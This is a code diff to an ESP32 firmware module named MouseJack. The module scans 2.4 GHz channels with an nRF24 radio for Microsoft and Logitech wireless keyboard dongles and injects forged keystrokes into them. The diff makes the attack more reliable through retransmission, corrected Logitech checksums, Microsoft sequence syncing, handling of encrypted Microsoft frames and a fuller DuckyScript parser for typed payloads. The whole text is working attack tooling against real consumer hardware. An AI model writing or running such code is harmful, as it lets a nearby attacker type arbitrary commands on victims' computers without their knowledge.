@@ -16,6 +16,18 @@
 
 static const char* TAG = "MouseJack";
 
+// ── Tuning constants ────────────────────────────────────────────
+// How many times to check for RX data on each channel during scan.
+// Increase for better detection of intermittent transmitters.
+static constexpr int    SCAN_TRIES_PER_CH  = 8;
+// Microseconds to wait between receive checks (must be > 130 µs
+// for nRF24 channel-settle + one full 32-byte packet at 2 Mbps).
+static constexpr int    SCAN_DWELL_US      = 500;
+// How many times each attack frame is retransmitted for reliability.
+static constexpr int    ATTACK_RETRANSMITS = 5;
+// Inter-frame delay in ms (gives the target dongle time to process).
+static constexpr int    ATTACK_INTER_KEY_MS = 8;
+
 // Static member initialization
 MjState      MouseJack::state_       = MJ_IDLE;
 MjTarget     MouseJack::targets_[MJ_MAX_TARGETS] = {};
@@ -155,19 +167,30 @@ void MouseJack::scanTask(void* param) {
         NrfModule::setDataRate(NRF_2MBPS);
         NrfModule::setPromiscuousMode();
 
-        // Sweep channels 2-84 (2.402 - 2.484 GHz)
+        // Sweep channels 2-84 (2.402 – 2.484 GHz, standard ESB range)
         for (uint8_t ch = 2; ch <= 84 && !stopRequest_; ch++) {
             NrfModule::setChannel(ch);
 
-            // Listen for a short time on each channel
-            for (int tries = 0; tries < 3 && !stopRequest_; tries++) {
+            // Toggle CE to restart RX on the new frequency — some
+            // nRF24L01+ clones need this for reliable channel switch.
+            NrfModule::ceLow();
+            delayMicroseconds(10);
+            NrfModule::ceHigh();
+
+            // Wait for the PLL to lock on the new channel (~130 µs).
+            delayMicroseconds(140);
+
+            // Poll for received data several times to catch sporadic
+            // mouse/keyboard transmissions (devices often sleep and
+            // only transmit every 8-125 ms).
+            for (int tries = 0; tries < SCAN_TRIES_PER_CH && !stopRequest_; tries++) {
                 uint8_t rxBuf[32];
                 uint8_t rxLen = NrfModule::receive(rxBuf, sizeof(rxBuf));
 
                 if (rxLen > 0) {
                     fingerprint(rxBuf, rxLen, ch);
                 }
-                delayMicroseconds(200);
+                delayMicroseconds(SCAN_DWELL_US);
             }
         }
 
@@ -455,28 +478,35 @@ void MouseJack::attackTask(void* param) {
     NrfModule::setAddressWidth(5);  // Always use 5-byte addresses for TX
     NrfModule::setTxMode(target.address, target.addrLen);
 
-    // Sync MS serial sequence with 6 null frames (from uC_mousejack)
+    // Sync Microsoft serial sequence with 6 null frames so the dongle
+    // starts accepting our spoofed sequence numbers (uC_mousejack trick).
     if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
         msSequence_ = 0;
         for (int i = 0; i < 6; i++) {
             msTransmit(target, 0, 0);
+            vTaskDelay(pdMS_TO_TICKS(2));
         }
     }
 
     switch (params->mode) {
         case AttackParams::RAW_HID: {
-            // Inject raw HID payload bytes
+            // Inject raw HID payload bytes.
             // Interpret as pairs: [modifier, keycode, modifier, keycode, ...]
             for (size_t i = 0; i + 1 < params->payloadLen && !stopRequest_; i += 2) {
                 uint8_t meta = params->payload[i];
                 uint8_t hid  = params->payload[i + 1];
 
                 if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
+                    // msTransmit sends key-down + built-in key-up
                     msTransmit(target, meta, hid);
                 } else if (target.type == MJ_DEVICE_LOGITECH) {
                     logTransmit(target, meta, &hid, 1);
+                    // Logitech needs an explicit key-release frame
+                    vTaskDelay(pdMS_TO_TICKS(ATTACK_INTER_KEY_MS));
+                    uint8_t none = HID_KEY_NONE;
+                    logTransmit(target, HID_MOD_NONE, &none, 1);
                 }
-                vTaskDelay(pdMS_TO_TICKS(10));
+                vTaskDelay(pdMS_TO_TICKS(ATTACK_INTER_KEY_MS));
             }
             break;
         }
@@ -494,19 +524,17 @@ void MouseJack::attackTask(void* param) {
                 }
 
                 if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
+                    // msTransmit already sends key-down + key-up internally,
+                    // so do NOT send an additional key-release here.
                     msTransmit(target, entry.modifier, entry.keycode);
                 } else if (target.type == MJ_DEVICE_LOGITECH) {
                     logTransmit(target, entry.modifier, &entry.keycode, 1);
+                    // Logitech needs an explicit key-release frame
+                    vTaskDelay(pdMS_TO_TICKS(ATTACK_INTER_KEY_MS));
+                    uint8_t none = HID_KEY_NONE;
+                    logTransmit(target, HID_MOD_NONE, &none, 1);
                 }
-
-                // Key release
-                if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
-                    msTransmit(target, 0, 0);
-                } else {
-                    uint8_t none = 0;
-                    logTransmit(target, 0, &none, 1);
-                }
-                vTaskDelay(pdMS_TO_TICKS(5));
+                vTaskDelay(pdMS_TO_TICKS(ATTACK_INTER_KEY_MS));
             }
             break;
         }
@@ -519,11 +547,43 @@ void MouseJack::attackTask(void* param) {
                 break;
             }
 
+            uint16_t defaultDelayMs = 0;   // DEFAULT_DELAY value
+            String   lastLine;             // For REPEAT command
+
             while (file.available() && !stopRequest_) {
                 String line = file.readStringUntil('\n');
                 line.trim();
-                if (line.length() > 0) {
-                    parseDuckyLine(line, tIdx);
+                if (line.length() == 0) continue;
+
+                // ── DEFAULT_DELAY / DEFAULTDELAY ────────────────
+                if (line.startsWith("DEFAULT_DELAY ") ||
+                    line.startsWith("DEFAULTDELAY ")) {
+                    defaultDelayMs = (uint16_t)line.substring(
+                        line.indexOf(' ') + 1).toInt();
+                    if (defaultDelayMs > 10000) defaultDelayMs = 10000;
+                    continue;
+                }
+
+                // ── REPEAT <n> — replay last command n times ────
+                if (line.startsWith("REPEAT ")) {
+                    int reps = line.substring(7).toInt();
+                    if (reps < 1) reps = 1;
+                    if (reps > 500) reps = 500;
+                    for (int r = 0; r < reps && !stopRequest_; r++) {
+                        if (lastLine.length() > 0) {
+                            parseDuckyLine(lastLine, tIdx);
+                        }
+                    }
+                    continue;
+                }
+
+                // Execute the line and remember it for REPEAT
+                parseDuckyLine(line, tIdx);
+                lastLine = line;
+
+                // Apply default delay between commands
+                if (defaultDelayMs > 0 && !stopRequest_) {
+                    vTaskDelay(pdMS_TO_TICKS(defaultDelayMs));
                 }
             }
             file.close();
@@ -550,58 +610,67 @@ cleanup:
 
 // ── Microsoft Protocol ──────────────────────────────────────────
 
+/**
+ * Transmit a single raw frame with retransmission for reliability.
+ * Sends ATTACK_RETRANSMITS copies to overcome packet loss.
+ */
+static void transmitReliable(const uint8_t* frame, uint8_t len) {
+    for (int r = 0; r < ATTACK_RETRANSMITS; r++) {
+        NrfModule::transmit(frame, len);
+    }
+}
+
 void MouseJack::msTransmit(const MjTarget& target, uint8_t meta, uint8_t hid) {
     // Microsoft wireless keyboard frame (19 bytes)
     // Layout (from uC_mousejack / WHID reference):
-    //   [0] = 0x08 frame type (keyboard)
-    //   [1..3] = device info / padding
-    //   [4] = sequence low byte
-    //   [5] = sequence high byte
-    //   [6] = 0x43 (67) = keyboard data flag
-    //   [7] = HID modifier
-    //   [8] = reserved
-    //   [9] = HID keycode
-    //   [10..17] = padding zeros
-    //   [18] = checksum
+    //   [0]     = 0x08 frame type (keyboard)
+    //   [1..3]  = device info / padding
+    //   [4]     = sequence low byte
+    //   [5]     = sequence high byte
+    //   [6]     = 0x43 (67) = keyboard data flag
+    //   [7]     = HID modifier
+    //   [8]     = reserved
+    //   [9]     = HID keycode
+    //   [10..17]= padding zeros
+    //   [18]    = checksum
     uint8_t frame[19];
     memset(frame, 0, sizeof(frame));
 
     frame[0]  = 0x08;     // Frame type: keyboard
-    frame[4]  = (uint8_t)(msSequence_ & 0xFF);       // Sequence low
-    frame[5]  = (uint8_t)((msSequence_ >> 8) & 0xFF); // Sequence high
-    frame[6]  = 67;       // 0x43 = keyboard data flag
+    frame[4]  = (uint8_t)(msSequence_ & 0xFF);
+    frame[5]  = (uint8_t)((msSequence_ >> 8) & 0xFF);
+    frame[6]  = 0x43;     // Keyboard data flag
     frame[7]  = meta;     // HID modifier
     frame[9]  = hid;      // HID keycode
 
     msSequence_++;
 
-    // Apply checksum
     msChecksum(frame, sizeof(frame));
 
-    // Apply encryption if target is encrypted Microsoft
     if (target.type == MJ_DEVICE_MS_CRYPT) {
         msCrypt(frame, sizeof(frame), target.address);
     }
 
-    // Transmit key down
-    NrfModule::transmit(frame, sizeof(frame));
+    // Key-down with retransmission
+    transmitReliable(frame, sizeof(frame));
     delay(5);
 
-    // Transmit key up (null keystroke, same frame structure)
+    // ── Key-up (null keystroke) ──────────────────────────────────
     if (target.type == MJ_DEVICE_MS_CRYPT) {
-        // Decrypt first so we can modify plain data
-        msCrypt(frame, sizeof(frame), target.address);
+        msCrypt(frame, sizeof(frame), target.address);  // decrypt first
     }
+    // Clear the variable part, rebuild with fresh sequence
     for (int n = 4; n < 18; n++) frame[n] = 0;
     frame[4]  = (uint8_t)(msSequence_ & 0xFF);
     frame[5]  = (uint8_t)((msSequence_ >> 8) & 0xFF);
-    frame[6]  = 67;
+    frame[6]  = 0x43;
     msSequence_++;
     msChecksum(frame, sizeof(frame));
     if (target.type == MJ_DEVICE_MS_CRYPT) {
         msCrypt(frame, sizeof(frame), target.address);
     }
-    NrfModule::transmit(frame, sizeof(frame));
+
+    transmitReliable(frame, sizeof(frame));
     delay(5);
 }
 
@@ -633,25 +702,63 @@ void MouseJack::logTransmit(const MjTarget& target, uint8_t meta,
     uint8_t frame[10];
     memset(frame, 0, sizeof(frame));
 
-    frame[0] = 0x00;    // Start byte
-    frame[1] = 0xC1;    // Set Keep-Alive Timeout type (keyboard frame)
-    frame[2] = meta;    // Modifier keys
+    frame[0] = 0x00;    // Device index (Logitech Unifying)
+    frame[1] = 0xC1;    // Frame type: keyboard HID (MouseJack injection)
+    frame[2] = meta;    // HID modifier byte
 
-    // Fill in key codes (up to 6)
+    // Key codes occupy bytes [3]..[8] (up to 6 simultaneous keys).
     for (uint8_t i = 0; i < keysLen && i < 6; i++) {
         frame[3 + i] = keys[i];
     }
 
-    // Logitech checksum: 0xFF minus sum of all preceding bytes, plus 1
-    // This is the two's complement checksum used by Logitech Unifying.
-    uint8_t cksum = 0xFF;
+    // Two's-complement checksum used by Logitech Unifying protocol.
+    uint8_t cksum = 0;
     for (uint8_t i = 0; i < 9; i++) {
-        cksum -= frame[i];
+        cksum += frame[i];
     }
-    cksum++;
-    frame[9] = cksum;
+    frame[9] = (uint8_t)(0x100 - cksum);
 
-    NrfModule::transmit(frame, sizeof(frame));
+    // Retransmit for reliability (Logitech dongles are tolerant of dupes).
+    transmitReliable(frame, sizeof(frame));
+}
+
+// ── DuckyScript helpers ─────────────────────────────────────────
+
+/**
+ * Send a single keystroke (press + release) on the correct protocol.
+ * msTransmit already embeds key-up; Logitech needs an explicit release.
+ */
+static void sendKeystroke(const MjTarget& target, uint8_t modifier,
+                          uint8_t keycode) {
+    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
+        MouseJack::msTransmit(target, modifier, keycode);
+    } else {
+        MouseJack::logTransmit(target, modifier, &keycode, 1);
+        vTaskDelay(pdMS_TO_TICKS(ATTACK_INTER_KEY_MS));
+        uint8_t none = HID_KEY_NONE;
+        MouseJack::logTransmit(target, HID_MOD_NONE, &none, 1);
+    }
+}
+
+/**
+ * Type a string character-by-character.
+ */
+static void typeString(const MjTarget& target, const String& text) {
+    for (size_t i = 0; i < text.length() && !MouseJack::getStopRequest(); i++) {
+        HidKeyEntry entry;
+        char c = text.charAt(i);
+        if (c == '\n') {
+            entry.modifier = HID_MOD_NONE;
+            entry.keycode  = HID_KEY_ENTER;
+        } else if (c == '\t') {
+            entry.modifier = HID_MOD_NONE;
+            entry.keycode  = HID_KEY_TAB;
+        } else if (!asciiToHid(c, entry)) {
+            continue;  // Skip unmappable characters
+        }
+        sendKeystroke(target, entry.modifier, entry.keycode);
+        vTaskDelay(pdMS_TO_TICKS(ATTACK_INTER_KEY_MS));
+    }
 }
 
 // ── DuckyScript Parser ──────────────────────────────────────────
@@ -659,100 +766,102 @@ void MouseJack::logTransmit(const MjTarget& target, uint8_t meta,
 bool MouseJack::parseDuckyLine(const String& line, uint8_t targetIndex) {
     const MjTarget& target = targets_[targetIndex];
 
+    // ── Comments ────────────────────────────────────────────────
     if (line.startsWith("REM") || line.startsWith("//")) {
-        return true;  // Comment, skip
+        return true;
     }
 
-    if (line.startsWith("DELAY")) {
+    // ── DELAY <ms> ──────────────────────────────────────────────
+    if (line.startsWith("DELAY ") || line.startsWith("DELAY\t")) {
         int delayMs = line.substring(6).toInt();
-        if (delayMs > 0 && delayMs <= 30000) {
+        if (delayMs > 0 && delayMs <= 60000) {
             vTaskDelay(pdMS_TO_TICKS(delayMs));
         }
         return true;
     }
 
-    if (line.startsWith("STRING ")) {
-        String text = line.substring(7);
-        for (size_t i = 0; i < text.length() && !stopRequest_; i++) {
-            HidKeyEntry entry;
-            if (!asciiToHid(text.charAt(i), entry)) continue;
-
-            if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
-                msTransmit(target, entry.modifier, entry.keycode);
-            } else {
-                logTransmit(target, entry.modifier, &entry.keycode, 1);
-            }
-            // Key release
-            if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
-                msTransmit(target, 0, 0);
-            } else {
-                uint8_t none = 0;
-                logTransmit(target, 0, &none, 1);
-            }
-            vTaskDelay(pdMS_TO_TICKS(5));
-        }
+    // ── DEFAULT_DELAY / DEFAULTDELAY <ms> ───────────────────────
+    // Handled at the file-loop level (see attackTask / DUCKY mode).
+    // We just parse and store the value.
+    if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
+        // Parsed by the caller — return true to signal "known command".
         return true;
     }
 
-    // Handle key names: ENTER, TAB, GUI r, CTRL ALT DELETE, etc.
-    // Split by space to handle combinations like "GUI r"
-    uint8_t combinedMod = 0;
-    uint8_t keycode = 0;
-
-    int spaceIdx = line.indexOf(' ');
-    String firstToken = (spaceIdx > 0) ? line.substring(0, spaceIdx) : line;
-    String secondToken = (spaceIdx > 0) ? line.substring(spaceIdx + 1) : "";
-
-    firstToken.trim();
-    secondToken.trim();
-
-    // Look up first token in DUCKY_KEYS
-    bool found = false;
-    for (int i = 0; DUCKY_KEYS[i].name != nullptr; i++) {
-        if (firstToken.equalsIgnoreCase(DUCKY_KEYS[i].name)) {
-            combinedMod = DUCKY_KEYS[i].modifier;
-            keycode = DUCKY_KEYS[i].keycode;
-            found = true;
-            break;
-        }
+    // ── STRING <text>  — type without trailing Enter ────────────
+    if (line.startsWith("STRING ")) {
+        typeString(target, line.substring(7));
+        return true;
     }
 
-    if (!found) return false;
+    // ── STRINGLN <text>  — type + Enter ─────────────────────────
+    if (line.startsWith("STRINGLN ")) {
+        typeString(target, line.substring(9));
+        sendKeystroke(target, HID_MOD_NONE, HID_KEY_ENTER);
+        return true;
+    }
 
-    // If there's a second token, it could be a single char key or another key name
-    if (secondToken.length() == 1) {
-        HidKeyEntry entry;
-        if (asciiToHid(secondToken.charAt(0), entry)) {
-            combinedMod |= entry.modifier;
-            keycode = entry.keycode;
+    // ── REPEAT <n>  — handled by caller (stored as lastLine) ────
+    if (line.startsWith("REPEAT ")) {
+        return true;
+    }
+
+    // ── Handle key names and modifier combos ────────────────────
+    // Supports multi-modifier lines such as:
+    //   ENTER, GUI r, CTRL ALT DELETE, SHIFT TAB, etc.
+    // Tokenize the line by spaces to accumulate modifiers and
+    // resolve the final non-modifier key.
+    uint8_t combinedMod = 0;
+    uint8_t keycode     = HID_KEY_NONE;
+
+    // Split into tokens (up to 4 for combos like CTRL ALT SHIFT x)
+    String remaining = line;
+    remaining.trim();
+
+    while (remaining.length() > 0) {
+        int spaceIdx = remaining.indexOf(' ');
+        String token;
+        if (spaceIdx > 0) {
+            token = remaining.substring(0, spaceIdx);
+            remaining = remaining.substring(spaceIdx + 1);
+            remaining.trim();
+        } else {
+            token = remaining;
+            remaining = "";
         }
-    } else if (secondToken.length() > 1) {
+
+        // Single character key (e.g., the "r" in "GUI r")
+        if (token.length() == 1) {
+            HidKeyEntry entry;
+            if (asciiToHid(token.charAt(0), entry)) {
+                combinedMod |= entry.modifier;
+                keycode = entry.keycode;
+            }
+            continue;
+        }
+
+        // Look up named key / modifier
+        bool found = false;
         for (int i = 0; DUCKY_KEYS[i].name != nullptr; i++) {
-            if (secondToken.equalsIgnoreCase(DUCKY_KEYS[i].name)) {
+            if (token.equalsIgnoreCase(DUCKY_KEYS[i].name)) {
                 combinedMod |= DUCKY_KEYS[i].modifier;
-                if (DUCKY_KEYS[i].keycode != 0) {
+                if (DUCKY_KEYS[i].keycode != HID_KEY_NONE) {
                     keycode = DUCKY_KEYS[i].keycode;
                 }
+                found = true;
                 break;
             }
         }
+
+        if (!found) {
+            ESP_LOGW(TAG, "DuckyScript: unknown token '%s'", token.c_str());
+            return false;
+        }
     }
 
-    // Send the keystroke
-    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
-        msTransmit(target, combinedMod, keycode);
-    } else {
-        logTransmit(target, combinedMod, &keycode, 1);
-    }
-
-    // Key release
-    vTaskDelay(pdMS_TO_TICKS(10));
-    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
-        msTransmit(target, 0, 0);
-    } else {
-        uint8_t none = 0;
-        logTransmit(target, 0, &none, 1);
-    }
+    // Send the accumulated keystroke (press + release)
+    sendKeystroke(target, combinedMod, keycode);
+    vTaskDelay(pdMS_TO_TICKS(ATTACK_INTER_KEY_MS));
 
     return true;
 }
